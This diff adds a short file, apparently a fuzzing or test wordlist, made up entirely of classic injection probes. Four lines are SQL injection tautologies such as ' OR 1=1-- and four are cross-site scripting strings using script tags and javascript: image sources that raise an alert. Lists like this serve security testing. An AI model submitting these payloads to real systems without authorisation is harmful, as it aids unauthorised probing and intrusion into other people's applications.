@@ -1,1 +1,8 @@
-
+' OR 1=1--
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+>"><script>alert("XSS")</script>&
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
